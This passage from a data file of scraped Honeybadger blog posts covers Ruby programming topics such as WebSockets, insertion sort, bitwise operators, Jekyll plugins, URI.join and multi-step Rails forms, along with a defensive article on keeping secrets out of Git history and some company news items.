0b10000001 , response . size , response ] Bombs away! At this point, we have an array containing the data that we want to send. We need to convert this to a string of bytes which we can send over the wire. To do this we will use the super-versatile Array#pack method. socket . write output . pack ( \"CCA #{ response . size } \" ) That strange string \"CCA#{ response.size }\" tells Array#pack that the array contains two 8-bit unsigned ints, followed by a character string of the specified size. If I open up the network inspector in chrome, I can see the message came through loud and clear. Extra Credit That's it! I hope you've learned something about WebSockets. There are a lot of things the server is missing. If you want to continue to exercise, you might look in them: Support for multi-frame payloads Binary payload support Ping / Pong support Long payload support Closing handshake", "date": "2016-02-18"},
{"website": "Honey-Badger", "title": "Understanding Insertion Sort in Ruby", "author": ["Julie Kent"], "link": "https://www.honeybadger.io/blog/ruby-insertion-sort/", "abstract": "Note: This is part 4 in a series looking at implementing various sorting algorithms with Ruby. Part 1 explored bubble sort , part 2 explored selection sort , and part 3 explored merge sort . As we continue to explore different methodologies for sorting data, we turn to insertion sort. There are a number of reasons to like insertion sort! First, insertion sort is stable , which means that it does not change the relative order of elements with equal keys. It's also an in-place algorithm , meaning that it does\nnot create a new array to store the sorted elements. Finally, insertion sort is a pretty simple algorithm to implement, as you'll soon see! Why Care It's difficult to avoid sounding like a broken record here, but as we've discussed in all of the previous posts, it's important to have an understanding of various mechanisms to sort data and what the trade-offs are with each of the various methods. For example, while insertion sort isn't very useful for large datasets (we'll explore this more below), it can be just fine and quite efficient for\nsmall datasets and those that are already close to being sorted. You'll learn why once we walk through the implementation. Sure, you'll often use built-in methods that your programming language of choice provides for sorting, but it just might pop up as an interview question as either a pair-program exercise or perhaps related to time complexity. Luckily, by the time we're done with this post,\nyou will be able to both code an insertion sort and understand the time complexity with ease. A Visual Representation Before we get started coding, I highly recommend checking out the following video. It explains insertion sort utilizing a dance, and personally, I can't get enough of it! :) Step-by-Step Walk-Through of the Code Let's look at the code! def insertion_sort ( array ) for i in 1 ... ( array . length ) # Step 1 j = i # Step 2 while j > 0 # Step 3 if array [ j - 1 ] > array [ j ] # Step 4 temp = array [ j ] array [ j ] = array [ j - 1 ] array [ j - 1 ] = temp else break end j = j - 1 # Step 5 end end return array end Step 1: We start with a for loop that sets variable i to 1 and continues to increment until i equals the length of our array. Step 2: We create another variable j and initialize it with a value of 1 (since that is what i is). Step 3: Next, we have a nested while loop that will continue as long as j is greater than zero. Since we start with j equal to 1, we know this will execute at least once. Step 4: The if... else block probably looks scary at first, but don't worry. It will make sense once we walk through it (and you can always revisit the dance YouTube example!). For the if condition, we check whether [j-1] is greater than array[j] . Since j is currently 1, we would essentially be comparing array[0] with array[1] . This makes sense because we're comparing the first two elements of the array. If the first element ( array[0] ) is larger than the next one ( array[1] ), then of course we need to swap, which is what happens within the if block. However, if the value in array[0] is less than the value in array[1] , then great! We don't need to do anything because it's already sorted, so we simply hit the break in the else block. Step 5: From here, we decrement j . Now, we're back to the for loop, and i is now going to be 2 . You can imagine how we'll be comparing array[1] with array[2] for the first iteration within the while loop, and then we'll actually go through the while loop again because our j started at 2 vs. 1 . Example with Real Data Let's walk through this code using the following example array: [5,7,2,10,9,12] In the first iteration, we'll be comparing 5 and 7 . Since 5 < 7 , we quickly break out of the if/else and move on. In the next iteration, we compare 7 and 2 . Now, these values will need to be swapped, so we'll have [5, 2, 7, 10, 9, 12] . Then, we'll swap the 2 again with the 5 to end up with [2, 5, 7, 10, 9, 12] . In the next iteration within the for loop, we'll compare 10 and 7 -- Yay! They're already in order. Moving on, we compare 10 and 9 and find that we need to swap. Then, 7 is less than 9 , so we won't have to perform any other swaps. We're now left with [2, 5, 7, 9, 10, 12] . The last iteration finds 12 , which is greater than 10 , so voila! We're done and sorted. Performance Analysis While some of the sorting algorithms we've looked at, namely bubble sort, are very rarely practiced in real life, insertion sort can be a reasonable solution. Imagine if our array was already sorted -- the insertion sort would run very quickly and efficiently. On the flip side, what happens if we need to sort an array that was in reverse order. That'd be a nightmare situation for insertion sort. If the array is already sorted, the insertion sort code will run at O(n) since it will only have to loop through n times. If you want to bear this out, add a puts i at the top of the method and run the program passing in an already-sorted array. If the array is reverse-sorted, the insertion sort code will run at O(n^2) You might be able to visualize this in your head. Since it will have to make consecutive swaps, it will hit the if condition for every single element. Yikes! Again, feel free to try this out by passing in a reverse-sorted array and create a counter variable that is printed out. Although worst case is O(n^2) which, as you may recall, is the same for bubble sort and selection sort, insertion sort is usually preferable. This is because, as we've seen, the best case could be O(n) , whereas the best case for selection sort is O(n^2) . Insertion sort also has fewer swaps than bubble sort, so it wins this battle. Wrap Up I hope that this post has been helpful and that you feel confident about understanding the pros and cons of insertion sort, as well as how the algorithm functions. If you're still itching for more, I recommend checking out the wikipedia page for insertion sort.", "date": "2021-04-26"},
{"website": "Honey-Badger", "title": "Bitwise hacks in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/bitwise-hacks-in-ruby/", "abstract": "Chances are you don't usually need to do any bitwise math in your day job. Ruby's bitwise AND and OR operators ( & and | ) are probably used more by accident than on purpose. Who hasn't accidentally typed & when they meant &&? But if you grew up programming lower level languages like C or Assembler, or in my case Turbo Pascal then you've probably done at least some bit twiddling. Bitwise solutions to problems are just cool. If you're able to solve a problem of yours using the most basic operations that a computer is capable of (binary math), it doesn't get any more elegant than that. Working with Binary in Ruby You probably know that everything in your computer is represented as numbers, and those numbers are in binary format. But what does that look like in ruby? In this example, I'm using Ruby to look up the ASCII char code for the letter \"a\", then printing it as \"binary.\" You can use the ord method in Ruby to get a character's ASCII code, and then use printf to print a \"binary\" representation of it. Although we have to use a method like printf to display the number in binary, it was always binary.  You can write binary numbers inside your Ruby code by using a syntax like 0b11111111 . To add binary literals to your code, prefix the string of ones and zeroes with 0b. So 0b11111111 Manipulating Binary Values Now that we know how to use binary literals in ruby, we can start playing with them. To do that we'll use the bitwise operators. You're probably comfortable with boolean operators like &&. The expression a && b returns true only if a and b are both true. Bitwise operators are very similar. For example, bitwise AND takes two values and compares them bit by bit. If both bits are 1, it sets the corresponding output bit to 1. If not, it sets it to zero. So if you have eight bits, you'll have eight separate ANDs happen. If you have one bit, you have one AND. The following examples illustrate this using a single bit. Example of bitwise AND operations with a single bit. It works the same for two bits. Each pair of bits is anded separately Ruby's Bitwise Operators Pretty much every programming languages comes with this set of bitwise operators. If you're not familiar with them, spend a little time in IRB trying them out. Once you learn them, you'll be able to use them for the rest of your life. Operator\nDescription\nExample & Bitwise AND Operator sets the result's bit to 1\nif it is 1 in both input values 0b1010 & 0b0111 == 0b0010 | Bitwise OR Operator set's the result's bit to 1\nif it is 1 in either input value 0b1010 | 0b0111 == 0b1111 ^ Bitwise XOR Operator sets the result bit to 1\nif it is 1 in either input value, but not both 0b1010 | 0b0111== 0b1101 ~ Bitwise Inverse operator sets result bit to 0\nif the input is 1 and vise versa ~0b1010 == 0b0101 << Bitwise Left Shift Operator . Moves the input bits left\nby a specified number of places. 0b1010 << 4== 0b10100000 >> Bitwise Right Shift Operator . Move input bits right\nby a certain number of places 0b1010 >> 4 == 0b0000 Practical Use: Configuration Flags Ok, ok, this has to be the most boring use of bitwise math. But it's also one of the most common. If you ever have to interface with code written in Java or C or C++ you'll come across bitwise configuration flags eventually. Imagine that it's 1996 and you just built a database system from scratch. Since you just watched the movie Hackers, you figure it might be good to build in some kind of access control. There are 8 actions that a user can take in your DB: read, write, delete, and five more.  You want to be able to set each of them independently. You might have a user that can read but not write or delete. You might have one that can write but not drop tables. The most efficient way to store these configuration flags is going  to be as bits in a single byte. Then a user will simply OR them together to create whatever combination of permissions they need. MYDB_READ = 0b00000001 # These numbers are called bitmasks MYDB_WRITE = 0b00000010 MYDB_DELETE = 0b00000100 MYDB_INDEX = 0b00001000 user . permissions = MYDB_READ | MYDB_WRITE By the way, this is really similar to how unix file permissions are handled. If you've ever wondered why you have to use a magic number just to make  a file read-only, now you know. It wouldn't be very useful to store configuration options in bits unless you could detect if a certain bit was set. To do that, you just use a bitwise AND. Use AND with a bitmask to determine if a bit is set. Less Practical Uses (Unless you're a C programmer) Now let's do some mathe-magical stuff. Historically, bit manipulation was used when you were trying to squeeze the last fraction of a millisecond off of some computation. So as you can imagine, it was used a lot by graphics programmers and others who needed performance above all else. So techniques like this aren't practical for everyday Ruby development.  But they're still a fun learning exercise, and could be legitimately useful if you get into things like embedded systems programming. For a much more thorough treatment, check out this list of bit twiddling hacks . Multiplying & Dividing by Powers of Two Let's look at the binary representations of the numbers 1, 2, 4, and 8. As you can see, doubling the number is equivalent to shifting all the bits one place to the left. Similarly, halving the number is the same as shifting right. Binary representations of 1, 2, 4 8 If you'll recall, we have shift-left and shift-right operators. That means we can multiply and divide by powers of two simply by shifting bits. You can use bitwise shift operators to multiply or divide by powers of two Averaging Two Positive Integers You can do basic addition of two integers like so:  (x+y) == (x&y)+(x|y) == (x^y)+2*(x&y). To calculate the average, all you need is a little division by two, which you can get via a right shift operator. You can average two positive integers like so: (x&y)+((x^y)>>1) Fast Inverse Square Root I couldn't do a blog post on bit twiddling without including one of the most legendary examples. That is John Carmack's fast inverse square root approximation, from the 1999 Quake 3 arena source code. The algorithm isn't his, but the most famous implementation is. I'm not going to attempt a direct port of this to Ruby, since it works by constructing a binary representation of a floating point number in a way that isn't directly translatable from C to Ruby. float Q_rsqrt ( float number ) { long i ; float x2 , y ; const float threehalfs = 1 . 5 F ; x2 = number * 0 . 5 F ; y = number ; i = * ( long * ) & y ; // evil floating point bit level hacking i = 0x5f3759df - ( i >> 1 ); // what the fuck? y = * ( float * ) & i ; y = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration //  y  = y * ( threehalfs - ( x2 * y * y ) );   // 2nd iteration, this can be removed return y ; }", "date": "2015-06-22"},
{"website": "Honey-Badger", "title": "Introducting FounderQuest, Honeybadger's New Podcast!", "author": ["Ben Findley"], "link": "https://www.honeybadger.io/blog/founderquest-s2-e4-should-you-blow-up-your-backlog/", "abstract": "What the heck is FounderQuest and what is it doing on the Honeybadger blog? FounderQuest is a weekly podcast recorded and produced by the founders of Honeybadger, Ben, Starr, and Josh ( these guys ). It covers a wide range of topics centered around their experiences bootstrapping and running Honeybadger. Many of the topics covered on this blog overlap with the podcast discussions so if you want more Honeybadger in your life (seriously who wouldn't) then it's probably worth a listen. You can access the entire back catalog here . On this week's episode of FounderQuest the guys weigh in on a recent debate sparked by Jason Fried at Basecamp around the value of backlogs. In short, Fried postulates that backlogs cause unnecessary stress and that if an idea will be forgotten about if it isn’t written down, then it probably isn’t important in the first place. Honeybadger does have a pretty significant backlog and some on the team find it more useful than others. Each of the guys discusses how they deal with the backlog, whether they ignore it 🙈​, stress out about it 😬​, embrace it as a useful part of the business 🤗​, or actively plot to burn it down 😈​​ and rebuild Honeybadger V2 from the ashes. Bonus, Ben talks about his recent trip and all of the different ways to cook and eat catfish! Don’t stress over adding FounderQuest to your backlog, listen now !", "date": "2019-11-08"},
{"website": "Honey-Badger", "title": "Here Are The Results of the Rocky Mountain Ruby 2016 Ticket Giveaway", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/rocky-mountain-ruby-2016-ticket-giveaway-winner/", "abstract": "The winner of our Rocky Mountain Ruby 2016 ticket giveaway is a toy designer by trade. He funded his last venture with Kickstarter . But he found crowdfunding challenging and inaccessible to smaller companies. By learning Ruby, he is on his way to building a pre-Kickstarter tool. So congratulations to Dale Taylor. He is attending Rocky Mountain Ruby 2016 , courtesy of Honeybadger. I asked him to share his experiences with Ruby, how his toy design work translates, and why he's looking forward to hearing Sarah Allen talk. (Me too! We should start a fan club.) Have a great time, Dale. What's your background in Ruby? I started learning Ruby on Rails (RoR) and Redis for a freelance job in 2013-2014. It was baptism by fire, helping an over-worked team deal with a large RoR API system during the holiday rush. The public API system had not been stress-tested after flipping the switch. After that job, I let my skills drop. Nevertheless, I'm committed to learning a modern web framework.  I was researching Ruby for my education when I saw a post about Rocky Mountain Ruby giving away a ticket! How does your toy design work relate to your desire to learn more about Ruby? Most new toys have an Internet of Things component or a web app these days. I plan to translate my background in physical product development into web and app-based products. What talks are you looking forward to at the conference? I’m looking forward to seeing Sarah Allen. She was a pioneer turning the text-based programs of the 1990s into beautiful motion and art-making software that non-programmers could use. That said, the Ruby community is active in the Denver area. I am also looking forward to seeing the founders. An offer for our contestants Thanks to all who participated. Look for an email with a special offer. Attending the conference ? Make sure to stop by the Honeybadger table for a t-shirt.", "date": "2016-09-27"},
{"website": "Honey-Badger", "title": "Automatically generate subnavigation from H2s in Jekyll", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/automatically-generating-subnavigation-from-headings-in-jekyll/", "abstract": "I've been rebuilding our documentation site using Jekyll. Since our documentation pages are pretty big, we have to have some kind of subnavigation in addition to the top-level navigation. In this post we'll cover how to make a simple Jekyll plug-in that can generate subnav links from the headings in your posts or pages. Overview I've broken this project down into the following tasks: Create a Jekyll generator which is run against every page on the site. Teach the generator how to pre-render the pages so that it can extract heading information. Use nokogiri  to parse the pages HTML extract the relevant headings and content. Render the subnavigation. In the examples below all of the subnav links are anchor links. For this approach to work, you'll need to make sure your markdown processor creates IDs for headings. RedCarpet with the with_toc_data option works nicely. A basic Jekyll Generator there are a couple of different types of plug-ins that you can create for Jekyll. We're going to be creating a generator. Generators are simply classes that inherit from Jekyll::Generator and which provide a method called generate . Generators are run after Jekyll loads all of the markdown files but before those files are converted to HTML. A site object is passed into the generate method. And you can use the site object to access all of your sites pages, posts and other resources. In the example below, we create a generator that loops through all pages and prints out their titles. class MySubnavGenerator < Jekyll :: Generator def generate ( site ) site . pages . each do | page | puts page . data [ \"title\" ] end end end We can also modify page and site data inside the generator -- data loaded from front-matter and from the site configuration file. page . data [ \"title\" ] += \" - modified!\" site . data [ \"tagline\" ] Pre-Rendering Markdown to HTML We want to extract headings from our markdown documents. The simplest way to do this is to convert the markdown to HTML then parse the HTML using a tool like nokogiri. Does this make me feel a little bit dirty? Yep. Will it be kinda slow? Absolutely.  But since Jekyll is a static site generator, I don't have to worry about real-time performance. So I'm just going to hold my nose and get it done. Here, we use Jekyll's built in markdown wrapper to convert every markdown page to HTML. class MySubnavGenerator < Jekyll :: Generator def generate ( site ) parser = Jekyll :: Converters :: Markdown . new ( site . config ) site . pages . each do | page | if page . ext == \".md\" html = parser . convert ( page [ 'content' ]) # Do something with the html here end end end end Extracting Headings For our new documentation site, I decided that every H2 tag should have a corresponding subnavigation link. So I will use nokogiri  to parse each page's HTML, then I will pluck out each H2 tag from the page. For now, we'll just print the H2's content and ID to screen: require \"nokogiri\" class MySubnavGenerator < Jekyll :: Generator def generate ( site ) parser = Jekyll :: Converters :: Markdown . new ( site . config ) site . pages . each do | page | if page . ext == \".md\" doc = Nokogiri :: HTML ( parser . convert ( page [ 'content' ])) doc . css ( 'h2' ). each do | heading | puts \" #{ heading . text } : #{ heading [ 'id' ] } \" end end end end end Creating the Subnavigation menu Now that we have the headings text and ID we can create a list of subnavigation links. We will store this list of links as a data attribute of the page itself. That way, we can access the links from our page template. require \"nokogiri\" class MySubnavGenerator < Jekyll :: Generator def generate ( site ) parser = Jekyll :: Converters :: Markdown . new ( site . config ) site . pages . each do | page | if page . ext == \".md\" doc = Nokogiri :: HTML ( parser . convert ( page [ 'content' ])) page . data [ \"subnav\" ] = [] doc . css ( 'h2' ). each do | heading | page . data [ \"subnav\" ] << { \"title\" => heading . text , \"url\" => [ page . url , heading [ 'id' ]]. join ( \"#\" ) } end end end end end Now, in your template, you can loop through the subnav and display each link: {% for item in page.subnav %} <a href=\" {{ item . url }} \"> {{ item . title }} </a> {% endfor %} Troubleshooting Like I mentioned before, this is all dependent on your markdown processor creating unique IDs for each heading. Here are my markdown settings from _config.yml : # Use the redcarpet Markdown renderer markdown : redcarpet redcarpet : extensions : [ ' no_intra_emphasis' , ' fenced_code_blocks' , ' autolink' , ' strikethrough' , ' superscript' , ' with_toc_data' , ' tables' , ' hardwrap' ] Next Up... The approach above works well if you only need one level of subnavigation. But what if you needed more? i.e. if you wanted all H3 tags \"inside\" of an H2 to create sub-subnavigation links in your menu? We'll be covering that and more in a future blog post. So stay tuned!", "date": "2015-10-12"},
{"website": "Honey-Badger", "title": "Plugging Git Leaks: Preventing and Fixing Information Exposure in Repositories", "author": ["Julien Cretel"], "link": "https://www.honeybadger.io/blog/git-security/", "abstract": "Private keys, third-party-API keys, database master passwords,\npersonally identifiable information... The consequences of exposing such\nsensitive information can be so dramatic for your organization and\nyour users that leaving it out of your source code is sound advice, if only in\nan effort to reduce your attack surface. What I find interesting is that, despite its many benefits, the widespread\nadoption of Git may have increased the risk of accidentally burying sensitive\ninformation in version-control repositories. Don't get me wrong: I love Git , and I wouldn't trade\nit for the world! Just hear me out. Committing more than intended is easy Git's main mechanism for staging changes, git-add , is arguably too\npowerful. For instance, running git add . will almost indiscriminately stage\nthe entire contents of the current working directory.\nEven with a proper gitignore hygiene, accidentally staging more\nthan intended is deceptively easy. Moreover, in my experience at least, many developers fail to review what\nthey've just staged and instead immediately proceed to create a new commit.\nTherefore, it's not unusual for developers to unwittingly commit sensitive\ninformation along with the intended changes. Detecting accidentally committed stuff can be hard There's something more pernicious and deceptive in Git's ecosystem, though:\nbecause most code collaboration tools such as GitHub, GitLab, Bitbucket, etc.\nhandle review at the pull-request level —as opposed to the commit\nlevel—sensitive data can easily escape the scrutiny of even the most diligent\ncode reviewers! The following example may suffice to convince you. Picture Bob, a developer working on a feature branch off of the master branch. Bob accidentally stages and commits sensitive.txt , which (guess what)\ncontains sensitive data. git add .\ngit commit -m \"Implement functionality foo\" Bob realizes his mistake but, having only a superficial understanding of how\nGit works, elects to solve the problem by creating a new commit (with a far\nfrom descriptive commit message) in order to stop tracking the problematic file: git rm --cached sensitive.txt\ngit commit -m \"Fix some stuff\" Bob, after tacking on a few more commits, then creates a pull request and asks\nAlice (a more seasoned Git user than Bob) to review his contribution. The commit graph looks something like this: * f7b5695 (master)\n* cc24446 Implement functionality foo\n* 541d8e9 Fix some stuff\n* ...\n* 330459d (HEAD -> feature) Ta da! At this point, most of you readers will likely realize that Bob failed to\nsolve the problem: the sensitive stuff is still present in the repo's history,\nin the diff between commits cc24446 and 541d8e9 . But wait! To review Bob's pull request, Alice is presented with a diff between feature and master , which is only a summary of Bob's changes!\nAs a result, unless Alice reviews the diff between each pair of commits that\nBob created—and few developers have the will or luxury to do that in\npractice—she will not realize that Bob introduced sensitive data in the repo's\nhistory. Satisfied, Alice gives Bob the thumbs-up and approves his pull request.\nSensitive data has just been buried in the repo's history! Fast-forward a few months... The team decides, perhaps as a way to give back\nto the community or for the sake of transparency, to open-source their hitherto\nclosed-source project. They do a quick pass to clean up the code, but fail to\naudit it for sensitive information (secrets, PII, etc.) lying dormant in the\nrepo's history. Their sensitive info has now leaked out of the organization and\nis accessible to the entire world! Someone's hunting for your sensitive information Your development team may fail to notice the presence of sensitive stuff in your\nrepositories, but that doesn't mean that other external actors won't find it.\nIn fact, some people have become adept at finding secrets and other forgotten\ntreasures buried deep in the history of public repositories.\nThey have a battery of tools at their disposal to assist their search.\nHere are just a few of them: Ethical hacker @TomNomNom came up with this shell oneliner ,\nwhich dumps the contents of a repository's object database, and whose output\nyou can pipe to grep , to great effect. The aptly named trufflehog allows you to search a repository's\nhistory for strings of high entropy or that match the signature of secrets of\nthird-party services (e.g., AWS). gitrob attemps to identify potentially sensitive files present in\na repository. Although some organizations offer a financial incentive to ethical hackers for\nreporting information-exposure issues to them, there's no question that\nmalicious actors, with way more nefarious goals than merely pocketing a bug\nbounty, are also scouring your public repositories for sensitive information. Sensitive stuff in your repo: What you should do So you've found sensitive data in your repository's history. Now what?\nThe answer largely depends on whether revocation is an option. For instance,\nif the sensitive stuff consists of an API key for a third-party service,\nyou can probably revoke that API key. Do that, adopt a proper secret-management\nsolution, and move on. But what if the sensitive stuff in question happens to be not a secret but personally identifiable information (PII) ? Perhaps you thought using your\nrelatives' names and addresses as test data at the prototype stage would\nbe funny, but you're not laughing now... Obviously, you cannot revoke PII or recall it if it has already leaked.\nHowever, what you can do is rewrite your repo's history to wipe all traces of\nit in your repository, thereby preventing it from leaking any further.\nEven though rewriting Git history has serious ramifications,\nincluding but not limited to provoking the ire of your open-source contributors,\nyou gotta do what you gotta do... Two tools come in handy for purging a repository of sensitive information: Git itself provides a subcommand named filter-branch .\nMake sure to read the man page carefully before invoking git filter-branch ,\nthough: it can be very destructive, so much so that the Pro Git Book rightfully\ndescribes it as \"the nuclear option\" of history rewriting. The BFC Repo-Cleaner is an external tool similar in spirit to git-filter-branch , but which excels at more specialized tasks. Finally, a formal apology to the owner(s) of the leaked PII is probably in\norder, too. How to keep sensitive stuff out in the first place There is no perfect solution, but a couple of tools and practices can help. git-secrets and Talisman work in a similar way.\nBoth tools are meant to be installed in local repositories as pre-commit hooks . If they detect that a prospective commit may\ncontain sensitive information, they will reject the commit and alert you to\nthe problem. Keep pull requests small. Allocate time to inspect intermediate diffs\nduring code review; don't misconstrue this piece of advice as a license to\nsquash commits willy-nilly, though.\nIf you find this practice too time-consuming, reduce the size of your pull\nrequests even further. Put yourself in the attacker's shoes: using trufflehog and friends,\nperiodically audit your repos for sensitive information. Shift security further to the left : why not strive for automation\nand integrate a tool like trufflehog into your CI/CD pipeline? Conclusion Keeping sensitive information out of Git repositories is surprisingly hard,\nbut all is not lost: a modicum of discipline, together with a handful of\nspecialized tools, can go a long way. Also, with the rise of DevSecOps , I wouldn't be surprised to\nwitness the advent of more sophisticated tools in the near future.\nWatch this space!", "date": "2020-02-25"},
{"website": "Honey-Badger", "title": "Monitorama 2016 Recap", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/monitorama-recap/", "abstract": "Our co-founder and resident human exception tracker, Josh, recently went to Monitorama 2016. He brought back goodies to share with our team! Here are a few highlights: Monitoring is Dead: Long Live Monitoring Greg tackles the question everyone wants to know: What is monitoring? He breaks it down by calling it \"an action of observing and checking the behavior and outputs of a system and its components over time.\" To add to the complexity, he also defines the terms of \"systems\" and \"components,\" amongst others. Greg, I don't know you, but my academic heart loves you for this. Let's get pizza and do a literature review of distributed systems research. The most interesting part is towards the conclusion, where he defines DevOps as a collaboration with other engineers. He proposes that monitoring is a part of building software, like test-driven development for production. Here the full talk. Keep a pad of paper handy for notes. Monitorama PDX 2016 - Greg Poirier - Monitoring is Dead. Long Live Monitoring from Monitorama on Vimeo . MonitoringScape The monitoring world is full of tools. How do you know which are complimentary to one another to build a monitoring strategy? Lucky for us, BigPanda summed it up in this awesome graphic. For more reading about the different monitoring tools, make sure to check out MonitoringScape for the full-sized graphic and a ton of information on the differences between each tool. If you need a recommendation for an error tracker, we know of one that's pretty badass . Dinner at Andina Okay, Josh couldn't share that one and we were a little jealous. But he also was on-call, got a maelstrom of alerts at 3 am, and didn't sleep that night. We can call it even. We Loved Monitorama 2016 If you want to geek out over monitoring, make sure to check out the rest of the talks . Make sure to let us know which was your favorite! We are always happy to geek out via Twitter .", "date": "2016-08-01"},
{"website": "Honey-Badger", "title": "Why is URI.join so counterintuitive?", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/why-is-uri-join-so-counterintuitive/", "abstract": "We just reached a milestone here at Honeybadger. Our sales pages are no longer part of our main Rails app. It's been on my wish list for years, but not exactly top priority. As part of this migration, I found myself using URI.join to construct particular redirect links. But I quickly ran into a problem. URI.join wasn't behaving as I expected. I expected it to take a bunch of path fragments and string them together like so: # This is what I was expecting. It didn't happen. URI . join ( \"https://www.honeybadger.io\" , \"plans\" , \"change\" ) => \"https://www.honeybadger.io/plans/change\" What the join method did is much stranger. It dropped one of my path fragments, only using the last one, \"change.\" # This is what happened. URI . join ( \"https://www.honeybadger.io\" , \"plans\" , \"change\" ) => \"https://www.honeybadger.io/change\" So why the heck does it work like this? The misunderstanding It turns out that I was expecting URI.join to behave similarly to a specialized version of Array#join , taking URL fragments and combining them to make a whole URL. That's not what it does. Big surprise. If we take a look at the join method's code, we see that it just iterates over all arguments, and calls merge on each. # File uri/rfc2396_parser.rb, line 236 def join ( * uris ) uris [ 0 ] = convert_to_uri ( uris [ 0 ]) uris . inject :merge end The merge method does two things: It converts your string like \"pages\" into a relative URI object. It tries to resolve the relative URI on to the base URI. It does this in exactly the way specified in RFC2396 , Section 5.2. So that's cool, but how does it explain the unexpected behavior I mentioned before? URI . join ( \"https://www.honeybadger.io\" , \"plans\" , \"change\" ) => \"https://www.honeybadger.io/change\" Let's step through it. The code above is equivalent to: URI . parse ( \"https://www.honeybadger.io/plans\" ). merge ( \"change\" ) The code above attempts to resolve the relative URI, \"change\" against the absolute URI \"https://www.honeybadger.io/plans\". To do this, it follows RFC2396 , Section 5.2.6, which states: a) All but the last segment of the base URI's path component is copied to the buffer.  In other words, any characters after the last (right-most) slash character, if any, are excluded. b) The reference's path component is appended to the buffer string. Let's play along: Copy everything but the final segment of the absolute URL. That gives me \"https://www.honeybadger.io/\" Append the relative path, resulting in \"https://www.honeybadger.io/change\" The world makes sense again! Conclusion While URI.join can be used to build URLs from various path fragments, that's not really what it's designed to do. It's designed to do something a little more complicated: recursively merge URIs per the standards specified in the RFC. As for my personal project — building URLs to use in redirects to our new sales pages — well, I just used Array#join instead. :) EDIT 8/12/2016: After publishing this article I received a couple of tweets suggesting I use File.join for this purpose. This has the benefit of avoiding double slashes, ie. /my//path but will break on OSs like Windows, where the path separator isn't a forward-slash.", "date": "2016-08-09"},
{"website": "Honey-Badger", "title": "A better method of handling multistep forms in rails", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/multi-step-forms-in-rails/", "abstract": "If there ever was a task that seemed straightforward from the outside, but then turned out to be really complicated when you got into it, a multi-step form is it. Why are multi-step forms so hard? The main challenge seems to be validating partial objects. There is not necessarily a one-to-one relationship between a step in your multi-step form and a model in your application. For example, let's say you have a user model with attributes email , password , first_name , last_name and homepage_url (all required). To avoid intimidating the user with a long form, you put email and password on the first page of your multi-step form and the rest of the fields on the second page. What you have is a single model split across two forms. (In reality you should maybe make a distinction between a user profile and a user account , but that's another matter.) This splitting of models across forms means you have to ask awkward questions like, \"Hey, ActiveRecord, is the half of this object I have so far valid?\" I don't think ActiveRecord was designed for validating parts of objects. From the examples I've seen where people try to do it, things get yucky Partial object validation is hard, and there's also a bigger problem Before you go on, please read (or at least scan) Building Partial Objects Step by Step in the Wicked gem wiki. The Wicked gem is absolutely the best Rails multi-step form tool I could find, and it looks like a lot of care was taken to cross all the t's and dot all the i's. I'm very impressed by the gem. That said, I have a different idea to suggest on how multi-step forms could be handled. You understand the MVC architecture pattern. It's an example of layered application architecture, and in MVC there are of course three layers. What you might not know is that it's possible, and often wise, to divide your application into finer layers than that. Some of those finer layer include: Domain layer: This is logic that exists independently of the fact that you're writing a computer program. It's just part of the domain with which you're working. Example: calculating the length and cost of an appointment. Persistence layer: The persistence layer has to do with, as you might have guessed, persistence. Example: saving an appointment to the database. Application layer : This is the administrative, nuts-and-bolts kind of work. Example: sending a thank-you email to the client. Most developers, including myself, are used to mixing domain, persistence, and application layers all together, willy-nilly, in the model layer. And for most small and medium-sized jobs, this is totally good and appropriate, the same way you wouldn't fire up an MVC framework to write tiny one-off throwaway script. But the hairier the task, the more layering is called for. What I'm saying is that I think multi-step forms are too hairy a task to put it all in the model, view and controller layers . Here are some of the responsibilities of a multi-step form and the layers in which I think they belong: Responsibility belongs to Layer: Validating a single step: Domain Moving forward and backward among steps: Application Saving data to the database: Persistence The Wicked gem—which, for the record, I think is a great accomplishment and way more work than I've done toward multi-step forms—puts a large amount of the logic in your ActiveRecord model class, which I think is a paradigm that could maybe be improved My proposed solution, but first, a counterexample This example, from the Wicked gem, is what it looks like when you take the fact that you have a multi-step form for creating a Product and you let that fact influence your model class definition: class Product < ActiveRecord :: Base validates :name , :presence => true , :if => :active_or_name? validates :price , :presence => true , :if => :active_or_price? validates :category , :presence => true , :if => :active_or_category? def active? status == 'active' end def active_or_name? status . include? ( 'name' ) || active? end def active_or_price? status . include? ( 'price' ) || active? end def active_or_category? status . include? ( 'category' ) || active? end end Again, no offense to Wicked, but all those conditional validations really bother me. Plus it seems like the fact that you have a multi-step form in your application shouldn't be a concern of your model layer. Why should your models care how the data gets My brilliant idea So, finally, my idea is that instead of this: Validate step 1 of the form Save step 1 to the database, move onto the next step Validate step 2 of the form Save step 2 to the database, move onto the next step etc. Done We should do this: Validate step 1 of the form, collect the data, move onto the next step Validate step 2 of the form, collect the data, move onto the next step etc. Save all the collected data to the database Done Let me put it another way as well: instead of building up an entity one piece at a time and permanently saving each piece as we go, we build up an entity candidate and then, if and when that candidate is valid and complete, the candidate entity becomes a true instance and we save it to the database. And as you might have guessed, the mechanism that guides the user through the form steps is a separate mechanism from what saves everything to the database. Imagine something like this: product_candidate = ProductCandidate . new # Validate each step, collect data, etc. Product . create_from_candidate! ( product_candidate ) That way, not only do you have presumably cleaner code, but you also don't have to subject your database to inconsistent data. You only persist your data once you have a complete entity (or set of entities). A rudimentary implementation I've actually implemented a very rudimentary version of this idea. It's in fact so rudimentary that the only interface it has is through the console, but it's still hopefully a useful illustration. First I instantiate my profile_candidate : > profile_candidate = ProfileCandidate . new ( ProfileCreationProcess . new ) Don't worry for now about what ProfileCreationProcess is. An EntityCandidate (from which ProfileCandidate inherits) knows certain things about itself, like which step it's on, whether it's complete and whether it's valid. > profile_candidate . current_step_number => 0 > profile_candidate . complete? => false > profile_candidate . valid? => false By the way, an EntityCandidate determines whether it's complete based on the current step vs. total number of steps, which is something else it knows: > profile_candidate . total_number_of_steps => 3 The three steps in this case are three super simple ones: a \"form\" containing first_name , a \"form\" with email and a third and final \"form\" containing phone . Here we can see what it's like to complete a step: > profile_candidate . first_name = 'Jason' => \"Jason\" > profile_candidate . valid? => true > profile_candidate . complete? => false > profile_candidate . save => true > profile_candidate . current_step_number => 1 If we go ahead and complete the 